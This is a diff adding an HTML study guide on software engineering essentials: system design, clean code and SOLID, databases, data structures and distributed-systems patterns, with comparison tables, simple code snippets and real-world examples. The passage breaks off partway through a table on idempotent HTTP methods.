@@ -1,0 +1,1294 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Software Engineering Essential Topics - Descriptive Guide</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            line-height: 1.8;
+            color: #333;
+            background: linear-gradient(135deg, #2c3e50 0%, #4ca1af 100%);
+            min-height: 100vh;
+            padding: 20px;
+        }
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            background: #fff;
+            border-radius: 20px;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+            overflow: hidden;
+        }
+        header {
+            background: linear-gradient(135deg, #e74c3c 0%, #c0392b 100%);
+            color: white;
+            padding: 40px;
+            text-align: center;
+        }
+        header h1 {
+            font-size: 2.5em;
+            margin-bottom: 10px;
+            text-shadow: 2px 2px 4px rgba(0,0,0,0.3);
+        }
+        header p {
+            font-size: 1.2em;
+            opacity: 0.9;
+        }
+        .content {
+            padding: 40px;
+        }
+        .topic-section {
+            margin-bottom: 50px;
+            border-left: 5px solid #e74c3c;
+            padding-left: 30px;
+        }
+        .topic-section h2 {
+            color: #2c3e50;
+            font-size: 1.8em;
+            margin-bottom: 20px;
+            padding-bottom: 10px;
+            border-bottom: 2px dashed #eee;
+        }
+        .subtopic {
+            background: #f9f9f9;
+            padding: 25px;
+            margin: 20px 0;
+            border-radius: 15px;
+            border: 1px solid #e0e0e0;
+        }
+        .subtopic h3 {
+            color: #e74c3c;
+            margin-bottom: 15px;
+            font-size: 1.3em;
+        }
+        .subtopic h4 {
+            color: #2c3e50;
+            margin: 15px 0 10px 0;
+            font-size: 1.1em;
+        }
+        .example-box {
+            background: linear-gradient(135deg, #ebf5fb 0%, #d4e6f1 100%);
+            border-left: 4px solid #3498db;
+            padding: 20px;
+            margin: 15px 0;
+            border-radius: 0 10px 10px 0;
+        }
+        .example-box h5 {
+            color: #3498db;
+            margin-bottom: 10px;
+            font-size: 1em;
+        }
+        .code-block {
+            background: #2d2d2d;
+            color: #f8f8f2;
+            padding: 20px;
+            border-radius: 10px;
+            overflow-x: auto;
+            font-family: 'Consolas', 'Monaco', monospace;
+            font-size: 0.9em;
+            margin: 15px 0;
+        }
+        .highlight {
+            background: linear-gradient(120deg, #ffecd2 0%, #fcb69f 100%);
+            padding: 3px 8px;
+            border-radius: 5px;
+            font-weight: bold;
+        }
+        .key-point {
+            background: #fff3cd;
+            border: 1px solid #ffc107;
+            padding: 15px;
+            border-radius: 10px;
+            margin: 15px 0;
+        }
+        .key-point::before {
+            content: "💡 ";
+        }
+        .warning-box {
+            background: #fdecea;
+            border: 1px solid #e74c3c;
+            padding: 15px;
+            border-radius: 10px;
+            margin: 15px 0;
+        }
+        .warning-box::before {
+            content: "⚠️ ";
+        }
+        ul, ol {
+            margin-left: 25px;
+            margin-top: 10px;
+        }
+        li {
+            margin-bottom: 8px;
+        }
+        .comparison-table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 20px 0;
+        }
+        .comparison-table th, .comparison-table td {
+            border: 1px solid #ddd;
+            padding: 12px;
+            text-align: left;
+        }
+        .comparison-table th {
+            background: linear-gradient(135deg, #2c3e50 0%, #4ca1af 100%);
+            color: white;
+        }
+        .comparison-table tr:nth-child(even) {
+            background: #f9f9f9;
+        }
+        .diagram-box {
+            background: #f5f5f5;
+            padding: 20px;
+            border-radius: 10px;
+            margin: 15px 0;
+            font-family: monospace;
+            text-align: center;
+        }
+        footer {
+            background: #333;
+            color: white;
+            text-align: center;
+            padding: 20px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <header>
+            <h1>🔧 Software Engineering Essentials</h1>
+            <p>A Comprehensive Guide for 3-4 Years Experience Level</p>
+        </header>
+        
+        <div class="content">
+            <!-- Topic 1: System Design -->
+            <section class="topic-section">
+                <h2>1. System Design (HLD & LLD)</h2>
+                
+                <div class="subtopic">
+                    <h3>Horizontal vs Vertical Scaling</h3>
+                    
+                    <table class="comparison-table">
+                        <tr>
+                            <th>Vertical Scaling (Scale Up)</th>
+                            <th>Horizontal Scaling (Scale Out)</th>
+                        </tr>
+                        <tr>
+                            <td>Add more power to existing machine (CPU, RAM)</td>
+                            <td>Add more machines to the pool</td>
+                        </tr>
+                        <tr>
+                            <td>Limited by hardware capacity</td>
+                            <td>Virtually unlimited scaling</td>
+                        </tr>
+                        <tr>
+                            <td>Single point of failure</td>
+                            <td>Built-in redundancy</td>
+                        </tr>
+                        <tr>
+                            <td>Simpler to implement</td>
+                            <td>Requires distributed system design</td>
+                        </tr>
+                        <tr>
+                            <td>Expensive high-end hardware</td>
+                            <td>Use commodity hardware</td>
+                        </tr>
+                    </table>
+                    
+                    <div class="example-box">
+                        <h5>🌍 Real-World Example</h5>
+                        <p><strong>Vertical:</strong> Your database server is slow. You upgrade from 16GB RAM to 64GB RAM and add more CPU cores.</p>
+                        <p><strong>Horizontal:</strong> Your web servers can't handle traffic. Instead of one big server, you use 10 smaller servers behind a load balancer.</p>
+                    </div>
+                </div>
+                
+                <div class="subtopic">
+                    <h3>Load Balancing</h3>
+                    <p>Load balancers distribute incoming traffic across multiple servers to ensure no single server is overwhelmed.</p>
+                    
+                    <h4>Load Balancing Algorithms</h4>
+                    <ul>
+                        <li><strong>Round Robin:</strong> Requests go to servers in rotation (1, 2, 3, 1, 2, 3...)</li>
+                        <li><strong>Weighted Round Robin:</strong> Stronger servers get more requests</li>
+                        <li><strong>Least Connections:</strong> Route to server with fewest active connections</li>
+                        <li><strong>IP Hash:</strong> Same client IP always goes to same server (session affinity)</li>
+                        <li><strong>Least Response Time:</strong> Route to fastest responding server</li>
+                    </ul>
+                    
+                    <h4>L4 vs L7 Load Balancing</h4>
+                    <table class="comparison-table">
+                        <tr>
+                            <th>L4 (Transport Layer)</th>
+                            <th>L7 (Application Layer)</th>
+                        </tr>
+                        <tr>
+                            <td>Works with TCP/UDP packets</td>
+                            <td>Works with HTTP/HTTPS content</td>
+                        </tr>
+                        <tr>
+                            <td>Faster, less overhead</td>
+                            <td>Slower but smarter routing</td>
+                        </tr>
+                        <tr>
+                            <td>Cannot inspect content</td>
+                            <td>Can route based on URL, headers, cookies</td>
+                        </tr>
+                    </table>
+                    
+                    <div class="example-box">
+                        <h5>🌍 Real-World Example: E-commerce Site</h5>
+                        <p>L7 load balancer routes /api/* to API servers, /images/* to CDN, and /checkout/* to high-security payment servers - all based on URL path.</p>
+                    </div>
+                </div>
+                
+                <div class="subtopic">
+                    <h3>Caching Strategies</h3>
+                    <p>Caching stores frequently accessed data in fast storage (memory) to reduce database load and improve response times.</p>
+                    
+                    <h4>Cache Update Strategies</h4>
+                    <ul>
+                        <li><strong>Cache-Aside (Lazy Loading):</strong> Application checks cache first. On miss, loads from DB and populates cache. Most common pattern.</li>
+                        <li><strong>Write-Through:</strong> Write to cache and DB simultaneously. Ensures consistency, adds write latency.</li>
+                        <li><strong>Write-Back (Write-Behind):</strong> Write to cache only, async write to DB later. Fast writes, risk of data loss.</li>
+                        <li><strong>Read-Through:</strong> Cache sits between app and DB. Cache fetches data on miss automatically.</li>
+                    </ul>
+                    
+                    <div class="diagram-box">
+<pre>Cache-Aside Pattern:
+
+  App → Cache (hit?) → Return data
+   ↓
+  (miss)
+   ↓
+  App → Database → Update Cache → Return data
+</pre>
+                    </div>
+                    
+                    <div class="example-box">
+                        <h5>🌍 Real-World Example: Twitter Timeline</h5>
+                        <p>Your home timeline is cached. When you refresh, Twitter checks cache first (fast). Only on cache miss does it query the database to build your timeline (slow).</p>
+                    </div>
+                    
+                    <div class="key-point">
+                        <strong>Redis vs Memcached:</strong> Redis supports data structures (lists, sets, sorted sets, hashes), persistence, and pub/sub. Memcached is simpler, purely in-memory key-value. Use Redis for complex caching needs, Memcached for simple session caching.
+                    </div>
+                </div>
+                
+                <div class="subtopic">
+                    <h3>Database Sharding & Partitioning</h3>
+                    
+                    <h4>Partitioning (within single database)</h4>
+                    <ul>
+                        <li><strong>Horizontal Partitioning:</strong> Split rows across tables (orders_2023, orders_2024)</li>
+                        <li><strong>Vertical Partitioning:</strong> Split columns (frequently vs rarely accessed)</li>
+                    </ul>
+                    
+                    <h4>Sharding (across multiple databases)</h4>
+                    <p>Distributes data across multiple database servers. Each shard holds a subset of data.</p>
+                    
+                    <table class="comparison-table">
+                        <tr>
+                            <th>Sharding Strategy</th>
+                            <th>How It Works</th>
+                            <th>Pros/Cons</th>
+                        </tr>
+                        <tr>
+                            <td>Range-based</td>
+                            <td>User IDs 1-1M on Shard1, 1M-2M on Shard2</td>
+                            <td>Simple, but can cause hotspots</td>
+                        </tr>
+                        <tr>
+                            <td>Hash-based</td>
+                            <td>shard = hash(user_id) % num_shards</td>
+                            <td>Even distribution, hard to add shards</td>
+                        </tr>
+                        <tr>
+                            <td>Directory-based</td>
+                            <td>Lookup table maps key to shard</td>
+                            <td>Flexible, lookup overhead</td>
+                        </tr>
+                    </table>
+                    
+                    <div class="example-box">
+                        <h5>🌍 Real-World Example: Instagram</h5>
+                        <p>Instagram shards user data by user_id. When you view someone's profile, the system knows exactly which shard to query based on their user_id hash.</p>
+                    </div>
+                </div>
+                
+                <div class="subtopic">
+                    <h3>CAP Theorem</h3>
+                    <p>In a distributed system, you can only guarantee two of three properties:</p>
+                    <ul>
+                        <li><strong>Consistency:</strong> Every read receives the most recent write</li>
+                        <li><strong>Availability:</strong> Every request receives a response (success or failure)</li>
+                        <li><strong>Partition Tolerance:</strong> System continues operating despite network failures</li>
+                    </ul>
+                    
+                    <div class="key-point">
+                        Since network partitions are unavoidable in distributed systems, you must choose between CP (consistency + partition tolerance) or AP (availability + partition tolerance).
+                    </div>
+                    
+                    <table class="comparison-table">
+                        <tr>
+                            <th>System Type</th>
+                            <th>Choice</th>
+                            <th>Example</th>
+                        </tr>
+                        <tr>
+                            <td>Banking System</td>
+                            <td>CP</td>
+                            <td>Better to reject transaction than show wrong balance</td>
+                        </tr>
+                        <tr>
+                            <td>Social Media Feed</td>
+                            <td>AP</td>
+                            <td>OK to show slightly stale data, must always respond</td>
+                        </tr>
+                    </table>
+                    
+                    <h4>Consistency Models</h4>
+                    <ul>
+                        <li><strong>Strong Consistency:</strong> All nodes see the same data at the same time</li>
+                        <li><strong>Eventual Consistency:</strong> All nodes will eventually have the same data, but reads might be stale</li>
+                    </ul>
+                </div>
+                
+                <div class="subtopic">
+                    <h3>Microservices vs Monolithic Architecture</h3>
+                    
+                    <table class="comparison-table">
+                        <tr>
+                            <th>Monolithic</th>
+                            <th>Microservices</th>
+                        </tr>
+                        <tr>
+                            <td>Single deployable unit</td>
+                            <td>Multiple independent services</td>
+                        </tr>
+                        <tr>
+                            <td>Shared database</td>
+                            <td>Each service owns its data</td>
+                        </tr>
+                        <tr>
+                            <td>Simple to develop initially</td>
+                            <td>Complex infrastructure needed</td>
+                        </tr>
+                        <tr>
+                            <td>Hard to scale individual components</td>
+                            <td>Scale services independently</td>
+                        </tr>
+                        <tr>
+                            <td>One technology stack</td>
+                            <td>Different tech per service</td>
+                        </tr>
+                    </table>
+                    
+                    <div class="example-box">
+                        <h5>🌍 Real-World Example: Netflix</h5>
+                        <p>Netflix has 700+ microservices: one for recommendations, one for streaming, one for user profiles, one for billing. If the recommendation service fails, you can still watch videos.</p>
+                    </div>
+                </div>
+                
+                <div class="subtopic">
+                    <h3>Message Queues</h3>
+                    <p>Message queues enable asynchronous communication between services, decoupling producers from consumers.</p>
+                    
+                    <table class="comparison-table">
+                        <tr>
+                            <th>Kafka</th>
+                            <th>RabbitMQ</th>
+                        </tr>
+                        <tr>
+                            <td>Distributed log-based</td>
+                            <td>Traditional message broker</td>
+                        </tr>
+                        <tr>
+                            <td>Messages persisted, replayable</td>
+                            <td>Messages deleted after consumption</td>
+                        </tr>
+                        <tr>
+                            <td>High throughput (millions/sec)</td>
+                            <td>Lower throughput, more features</td>
+                        </tr>
+                        <tr>
+                            <td>Event streaming, logs, analytics</td>
+                            <td>Task queues, request-response</td>
+                        </tr>
+                    </table>
+                    
+                    <div class="example-box">
+                        <h5>🌍 Real-World Example: Order Processing</h5>
+                        <p>When you place an order: OrderService publishes to queue. PaymentService, InventoryService, NotificationService each consume the message independently. If one is down, others still work.</p>
+                    </div>
+                </div>
+                
+                <div class="subtopic">
+                    <h3>Rate Limiting & Throttling</h3>
+                    <p>Protects services from abuse and ensures fair resource usage.</p>
+                    
+                    <h4>Common Algorithms</h4>
+                    <ul>
+                        <li><strong>Token Bucket:</strong> Tokens added at fixed rate. Request uses a token. No token = rate limited.</li>
+                        <li><strong>Leaky Bucket:</strong> Requests enter bucket, processed at fixed rate. Overflow is rejected.</li>
+                        <li><strong>Fixed Window:</strong> Count requests in fixed time windows (e.g., 100 req/minute).</li>
+                        <li><strong>Sliding Window:</strong> Rolling count over the past N seconds.</li>
+                    </ul>
+                    
+                    <div class="example-box">
+                        <h5>🌍 Real-World Example: Twitter API</h5>
+                        <p>Twitter allows 300 tweets per 3-hour window per user. This prevents spam bots from overwhelming the platform while allowing normal users to tweet freely.</p>
+                    </div>
+                </div>
+            </section>
+            
+            <!-- Topic 2: Clean Code & Architecture -->
+            <section class="topic-section">
+                <h2>2. Clean Code, Architecture & Design Patterns</h2>
+                
+                <div class="subtopic">
+                    <h3>SOLID Principles</h3>
+                    
+                    <h4>S - Single Responsibility Principle</h4>
+                    <p>A class should have only one reason to change - one job, one responsibility.</p>
+                    
+                    <div class="example-box">
+                        <h5>🌍 Real-World Example</h5>
+                        <p><strong>Bad:</strong> UserService handles login, sends emails, generates reports, and validates data.<br>
+                        <strong>Good:</strong> AuthService handles login, EmailService sends emails, ReportService generates reports.</p>
+                    </div>
+                    
+                    <h4>O - Open/Closed Principle</h4>
+                    <p>Software entities should be open for extension but closed for modification. Add new features without changing existing code.</p>
+                    
+                    <div class="code-block">
+<pre>// Bad: Modify method every time you add a new payment type
+class PaymentProcessor {
+    process(payment) {
+        if (payment.type === 'credit') { ... }
+        else if (payment.type === 'paypal') { ... }
+        else if (payment.type === 'crypto') { ... }  // Keep adding
+    }
+}
+
+// Good: Add new payment types without changing existing code
+interface PaymentStrategy {
+    process(payment): void;
+}
+class CreditCardPayment implements PaymentStrategy { ... }
+class PayPalPayment implements PaymentStrategy { ... }
+class CryptoPayment implements PaymentStrategy { ... }  // Just add new class</pre>
+                    </div>
+                    
+                    <h4>L - Liskov Substitution Principle</h4>
+                    <p>Subclasses should be substitutable for their base classes without breaking the program.</p>
+                    
+                    <div class="example-box">
+                        <h5>🌍 Real-World Example</h5>
+                        <p><strong>Violation:</strong> Square extends Rectangle, but setWidth() breaks because Square must keep width=height. A Square cannot fully substitute a Rectangle.</p>
+                    </div>
+                    
+                    <h4>I - Interface Segregation Principle</h4>
+                    <p>Clients should not be forced to depend on interfaces they don't use. Split large interfaces into smaller, specific ones.</p>
+                    
+                    <div class="code-block">
+<pre>// Bad: Fat interface
+interface Worker {
+    work();
+    eat();
+    sleep();
+}
+// Robot doesn't eat or sleep!
+
+// Good: Segregated interfaces
+interface Workable { work(); }
+interface Eatable { eat(); }
+interface Sleepable { sleep(); }
+
+class Robot implements Workable { ... }
+class Human implements Workable, Eatable, Sleepable { ... }</pre>
+                    </div>
+                    
+                    <h4>D - Dependency Inversion Principle</h4>
+                    <p>High-level modules should not depend on low-level modules. Both should depend on abstractions.</p>
+                    
+                    <div class="code-block">
+<pre>// Bad: High-level depends on low-level
+class OrderService {
+    private MySQLDatabase db = new MySQLDatabase();  // Tightly coupled
+}
+
+// Good: Depend on abstraction
+class OrderService {
+    private Database db;  // Interface
+    
+    OrderService(Database db) {
+        this.db = db;  // Inject dependency
+    }
+}
+// Can use MySQL, PostgreSQL, MongoDB - any implementation</pre>
+                    </div>
+                </div>
+                
+                <div class="subtopic">
+                    <h3>Design Patterns Overview</h3>
+                    
+                    <h4>Creational Patterns</h4>
+                    <ul>
+                        <li><strong>Singleton:</strong> One instance globally (database connection pool)</li>
+                        <li><strong>Factory:</strong> Create objects without specifying exact class (document creator)</li>
+                        <li><strong>Builder:</strong> Construct complex objects step by step (SQL query builder)</li>
+                        <li><strong>Prototype:</strong> Clone existing objects (game character presets)</li>
+                    </ul>
+                    
+                    <h4>Structural Patterns</h4>
+                    <ul>
+                        <li><strong>Adapter:</strong> Convert interface to match another (power adapter)</li>
+                        <li><strong>Decorator:</strong> Add behavior dynamically (coffee with extras)</li>
+                        <li><strong>Facade:</strong> Simple interface to complex system (home theater remote)</li>
+                        <li><strong>Proxy:</strong> Placeholder for another object (image lazy loading)</li>
+                    </ul>
+                    
+                    <h4>Behavioral Patterns</h4>
+                    <ul>
+                        <li><strong>Observer:</strong> Notify subscribers of changes (newsletter)</li>
+                        <li><strong>Strategy:</strong> Interchangeable algorithms (sorting strategies)</li>
+                        <li><strong>Template Method:</strong> Define skeleton, subclasses fill details (data export formats)</li>
+                        <li><strong>Chain of Responsibility:</strong> Pass request through handler chain (middleware)</li>
+                    </ul>
+                </div>
+                
+                <div class="subtopic">
+                    <h3>Domain-Driven Design (DDD) Basics</h3>
+                    
+                    <ul>
+                        <li><strong>Entity:</strong> Object with unique identity that persists over time (User, Order)</li>
+                        <li><strong>Value Object:</strong> Immutable object defined by attributes, no identity (Money, Address)</li>
+                        <li><strong>Aggregate:</strong> Cluster of entities treated as unit, one root entity (Order + OrderItems)</li>
+                        <li><strong>Repository:</strong> Abstraction for data access (UserRepository)</li>
+                        <li><strong>Domain Service:</strong> Business logic that doesn't belong to entities</li>
+                    </ul>
+                    
+                    <div class="example-box">
+                        <h5>🌍 Real-World Example: E-commerce Order</h5>
+                        <p><strong>Order (Aggregate Root):</strong> Contains OrderItems (entities within aggregate).<br>
+                        <strong>Money (Value Object):</strong> $99.99 - no identity, just a value.<br>
+                        You can only access OrderItems through Order, never directly.</p>
+                    </div>
+                </div>
+                
+                <div class="subtopic">
+                    <h3>Hexagonal Architecture (Clean Architecture)</h3>
+                    <p>Separates business logic from external concerns (database, UI, frameworks).</p>
+                    
+                    <div class="diagram-box">
+<pre>
+        ┌─────────────────────────────────┐
+        │          Frameworks &           │
+        │    External Systems (Web, DB)   │
+        │  ┌───────────────────────────┐  │
+        │  │      Interface Adapters   │  │
+        │  │   (Controllers, Repos)    │  │
+        │  │  ┌─────────────────────┐  │  │
+        │  │  │   Application Layer │  │  │
+        │  │  │    (Use Cases)      │  │  │
+        │  │  │  ┌───────────────┐  │  │  │
+        │  │  │  │ Domain Layer  │  │  │  │
+        │  │  │  │ (Entities,    │  │  │  │
+        │  │  │  │  Value Objects)│  │  │  │
+        │  │  │  └───────────────┘  │  │  │
+        │  │  └─────────────────────┘  │  │
+        │  └───────────────────────────┘  │
+        └─────────────────────────────────┘
+        
+  Dependency Rule: Inner layers know nothing about outer layers.
+</pre>
+                    </div>
+                    
+                    <div class="key-point">
+                        <strong>Key Benefit:</strong> Your business logic (center) doesn't depend on frameworks, databases, or UI. You can swap PostgreSQL for MongoDB, or web UI for CLI, without changing business rules.
+                    </div>
+                </div>
+            </section>
+            
+            <!-- Topic 3: Databases -->
+            <section class="topic-section">
+                <h2>3. Databases</h2>
+                
+                <div class="subtopic">
+                    <h3>ACID Properties</h3>
+                    <ul>
+                        <li><strong>Atomicity:</strong> All operations succeed or all fail (all or nothing)</li>
+                        <li><strong>Consistency:</strong> Database moves from one valid state to another</li>
+                        <li><strong>Isolation:</strong> Concurrent transactions don't interfere</li>
+                        <li><strong>Durability:</strong> Committed data survives system failures</li>
+                    </ul>
+                    
+                    <h4>Isolation Levels</h4>
+                    <table class="comparison-table">
+                        <tr>
+                            <th>Level</th>
+                            <th>Dirty Read</th>
+                            <th>Non-Repeatable Read</th>
+                            <th>Phantom Read</th>
+                        </tr>
+                        <tr>
+                            <td>Read Uncommitted</td>
+                            <td>Yes</td>
+                            <td>Yes</td>
+                            <td>Yes</td>
+                        </tr>
+                        <tr>
+                            <td>Read Committed</td>
+                            <td>No</td>
+                            <td>Yes</td>
+                            <td>Yes</td>
+                        </tr>
+                        <tr>
+                            <td>Repeatable Read</td>
+                            <td>No</td>
+                            <td>No</td>
+                            <td>Yes</td>
+                        </tr>
+                        <tr>
+                            <td>Serializable</td>
+                            <td>No</td>
+                            <td>No</td>
+                            <td>No</td>
+                        </tr>
+                    </table>
+                    
+                    <div class="example-box">
+                        <h5>🌍 Real-World Example: Bank Transfer</h5>
+                        <p><strong>Dirty Read:</strong> You see $1000 transferred to your account, but the sender's transaction is rolled back.<br>
+                        <strong>Non-Repeatable Read:</strong> You read balance as $500, read again, it's $300 (someone withdrew).<br>
+                        <strong>Phantom Read:</strong> Count transactions shows 10, count again shows 12 (new rows appeared).</p>
+                    </div>
+                </div>
+                
+                <div class="subtopic">
+                    <h3>Indexing</h3>
+                    <p>Indexes speed up data retrieval at the cost of slower writes and storage space.</p>
+                    
+                    <h4>Index Types</h4>
+                    <ul>
+                        <li><strong>B-Tree Index:</strong> Default. Good for equality and range queries. Most versatile.</li>
+                        <li><strong>B+ Tree Index:</strong> Leaf nodes linked. Better for range scans. Used by most databases.</li>
+                        <li><strong>Hash Index:</strong> Only equality comparisons. O(1) lookup. No range queries.</li>
+                        <li><strong>Composite Index:</strong> Multiple columns. Order matters! (last_name, first_name)</li>
+                    </ul>
+                    
+                    <div class="key-point">
+                        <strong>Composite Index Order:</strong> Index on (a, b, c) can be used for queries on (a), (a, b), or (a, b, c), but NOT (b, c) alone. Put most selective columns first.
+                    </div>
+                    
+                    <div class="example-box">
+                        <h5>🌍 Real-World Example: Phone Book</h5>
+                        <p>A phone book is indexed by last name. Finding "Smith" is fast. Finding everyone named "John" requires scanning the whole book (no index on first name).</p>
+                    </div>
+                </div>
+                
+                <div class="subtopic">
+                    <h3>SQL vs NoSQL</h3>
+                    
+                    <table class="comparison-table">
+                        <tr>
+                            <th>SQL (Relational)</th>
+                            <th>NoSQL</th>
+                        </tr>
+                        <tr>
+                            <td>Structured schema</td>
+                            <td>Flexible schema</td>
+                        </tr>
+                        <tr>
+                            <td>ACID transactions</td>
+                            <td>Eventual consistency (usually)</td>
+                        </tr>
+                        <tr>
+                            <td>Complex joins</td>
+                            <td>Denormalized, less joining</td>
+                        </tr>
+                        <tr>
+                            <td>Vertical scaling typically</td>
+                            <td>Horizontal scaling built-in</td>
+                        </tr>
+                        <tr>
+                            <td>PostgreSQL, MySQL</td>
+                            <td>MongoDB, Cassandra, Redis</td>
+                        </tr>
+                    </table>
+                    
+                    <h4>When to Choose What</h4>
+                    <ul>
+                        <li><strong>Use SQL:</strong> Complex queries, transactions, data integrity critical (banking, inventory)</li>
+                        <li><strong>Use MongoDB:</strong> Flexible schema, document-oriented, rapid development (content management)</li>
+                        <li><strong>Use Cassandra:</strong> Write-heavy, high availability, time-series data (IoT, logging)</li>
+                        <li><strong>Use Redis:</strong> Caching, sessions, real-time features (leaderboards, pub/sub)</li>
+                    </ul>
+                </div>
+                
+                <div class="subtopic">
+                    <h3>Optimistic vs Pessimistic Locking</h3>
+                    
+                    <table class="comparison-table">
+                        <tr>
+                            <th>Pessimistic Locking</th>
+                            <th>Optimistic Locking</th>
+                        </tr>
+                        <tr>
+                            <td>Lock record before reading</td>
+                            <td>No locks during read</td>
+                        </tr>
+                        <tr>
+                            <td>Prevents conflicts</td>
+                            <td>Detects conflicts at commit</td>
+                        </tr>
+                        <tr>
+                            <td>SELECT FOR UPDATE</td>
+                            <td>Version column comparison</td>
+                        </tr>
+                        <tr>
+                            <td>High contention scenarios</td>
+                            <td>Low contention scenarios</td>
+                        </tr>
+                        <tr>
+                            <td>Risk of deadlocks</td>
+                            <td>Risk of retry storms</td>
+                        </tr>
+                    </table>
+                    
+                    <div class="code-block">
+<pre>-- Optimistic Locking with version column
+UPDATE products 
+SET quantity = 5, version = version + 1 
+WHERE id = 123 AND version = 7;
+
+-- If 0 rows affected, someone else updated it first → retry</pre>
+                    </div>
+                </div>
+            </section>
+            
+            <!-- Topic 4: Data Structures & Algorithms -->
+            <section class="topic-section">
+                <h2>4. Data Structures & Algorithms</h2>
+                
+                <div class="subtopic">
+                    <h3>Big O Notation Reference</h3>
+                    
+                    <table class="comparison-table">
+                        <tr>
+                            <th>Complexity</th>
+                            <th>Name</th>
+                            <th>Example</th>
+                        </tr>
+                        <tr>
+                            <td>O(1)</td>
+                            <td>Constant</td>
+                            <td>Array access, hash table lookup</td>
+                        </tr>
+                        <tr>
+                            <td>O(log n)</td>
+                            <td>Logarithmic</td>
+                            <td>Binary search</td>
+                        </tr>
+                        <tr>
+                            <td>O(n)</td>
+                            <td>Linear</td>
+                            <td>Linear search, single loop</td>
+                        </tr>
+                        <tr>
+                            <td>O(n log n)</td>
+                            <td>Linearithmic</td>
+                            <td>Merge sort, quick sort (average)</td>
+                        </tr>
+                        <tr>
+                            <td>O(n²)</td>
+                            <td>Quadratic</td>
+                            <td>Bubble sort, nested loops</td>
+                        </tr>
+                        <tr>
+                            <td>O(2ⁿ)</td>
+                            <td>Exponential</td>
+                            <td>Recursive Fibonacci, subset generation</td>
+                        </tr>
+                    </table>
+                </div>
+                
+                <div class="subtopic">
+                    <h3>Hash Tables & Collision Handling</h3>
+                    <p>Hash tables provide O(1) average case for insert, delete, and lookup.</p>
+                    
+                    <h4>Collision Resolution</h4>
+                    <ul>
+                        <li><strong>Chaining:</strong> Store colliding elements in a linked list at same bucket</li>
+                        <li><strong>Open Addressing:</strong> Find another slot (linear probing, quadratic probing, double hashing)</li>
+                    </ul>
+                    
+                    <div class="example-box">
+                        <h5>🌍 Real-World Example</h5>
+                        <p>Dictionary (HashMap) in programming: keys are hashed to determine where to store values. Good hash function = uniform distribution = fewer collisions.</p>
+                    </div>
+                </div>
+                
+                <div class="subtopic">
+                    <h3>Trees</h3>
+                    
+                    <h4>Binary Search Tree (BST)</h4>
+                    <p>Left child < parent < right child. O(log n) operations when balanced.</p>
+                    
+                    <h4>Self-Balancing Trees</h4>
+                    <ul>
+                        <li><strong>AVL Tree:</strong> Strictly balanced (height difference ≤ 1). More rotations, faster lookup.</li>
+                        <li><strong>Red-Black Tree:</strong> Loosely balanced. Fewer rotations, used in TreeMap/TreeSet.</li>
+                    </ul>
+                    
+                    <h4>Tries (Prefix Trees)</h4>
+                    <p>Used for efficient string operations like autocomplete and spell check.</p>
+                    
+                    <div class="example-box">
+                        <h5>🌍 Real-World Example: Autocomplete</h5>
+                        <p>When you type "app" in a search box, a Trie efficiently finds all words starting with "app": apple, application, approach, etc.</p>
+                    </div>
+                </div>
+                
+                <div class="subtopic">
+                    <h3>Graph Traversals</h3>
+                    
+                    <table class="comparison-table">
+                        <tr>
+                            <th>BFS (Breadth-First Search)</th>
+                            <th>DFS (Depth-First Search)</th>
+                        </tr>
+                        <tr>
+                            <td>Uses Queue</td>
+                            <td>Uses Stack (or recursion)</td>
+                        </tr>
+                        <tr>
+                            <td>Explores level by level</td>
+                            <td>Explores as deep as possible first</td>
+                        </tr>
+                        <tr>
+                            <td>Shortest path (unweighted)</td>
+                            <td>Cycle detection, topological sort</td>
+                        </tr>
+                        <tr>
+                            <td>More memory for wide graphs</td>
+                            <td>More memory for deep graphs</td>
+                        </tr>
+                    </table>
+                    
+                    <div class="example-box">
+                        <h5>🌍 Real-World Example</h5>
+                        <p><strong>BFS:</strong> Finding shortest path in Google Maps (nodes = intersections, edges = roads).<br>
+                        <strong>DFS:</strong> Solving a maze (go deep, backtrack when stuck).</p>
+                    </div>
+                </div>
+            </section>
+            
+            <!-- Topic 5: Distributed Systems -->
+            <section class="topic-section">
+                <h2>5. Distributed Systems Concepts</h2>
+                
+                <div class="subtopic">
+                    <h3>Consensus Algorithms</h3>
+                    <p>How distributed nodes agree on a single value despite failures.</p>
+                    
+                    <h4>Raft (Easier to understand than Paxos)</h4>
+                    <ol>
+                        <li><strong>Leader Election:</strong> One node becomes leader</li>
+                        <li><strong>Log Replication:</strong> Leader replicates commands to followers</li>
+                        <li><strong>Safety:</strong> Only log entries from leader with majority support are committed</li>
+                    </ol>
+                    
+                    <div class="example-box">
+                        <h5>🌍 Real-World Example: Distributed Database</h5>
+                        <p>CockroachDB uses Raft to ensure all replicas agree on the order of transactions. If leader dies, a new one is elected automatically.</p>
+                    </div>
+                </div>
+                
+                <div class="subtopic">
+                    <h3>Circuit Breaker Pattern</h3>
+                    <p>Prevents cascading failures by stopping requests to a failing service.</p>
+                    
+                    <h4>States</h4>
+                    <ul>
+                        <li><strong>Closed:</strong> Normal operation, requests pass through</li>
+                        <li><strong>Open:</strong> Service failing, requests fail immediately (fast fail)</li>
+                        <li><strong>Half-Open:</strong> Test if service recovered, allow limited requests</li>
+                    </ul>
+                    
+                    <div class="diagram-box">
+<pre>
+    ┌─────────── Failure threshold reached ───────────┐
+    │                                                 │
+    ▼                                                 │
+┌────────┐                                       ┌────────┐
+│ CLOSED │ ─────── Success ───────────────────── │  OPEN  │
+└────────┘                                       └────────┘
+    ▲                                                 │
+    │                                                 │
+    └────────────── Test request succeeds ────────────┘
+                         (Half-Open)
+</pre>
+                    </div>
+                    
+                    <div class="example-box">
+                        <h5>🌍 Real-World Example: Payment Service</h5>
+                        <p>If payment service is down, circuit breaker opens. Instead of waiting/timing out for each order, fail immediately and show "Try again later" - better user experience, less load on struggling service.</p>
+                    </div>
+                </div>
+                
+                <div class="subtopic">
+                    <h3>Idempotency</h3>
+                    <p>An operation is idempotent if executing it multiple times has the same effect as executing it once.</p>
+                    
+                    <table class="comparison-table">
+                        <tr>
+                            <th>HTTP Method</th>
+                            <th>Idempotent?</th>
+                            <th>Example</th>
+                        </tr>
+                        <tr>
+                            <td>GET</td>
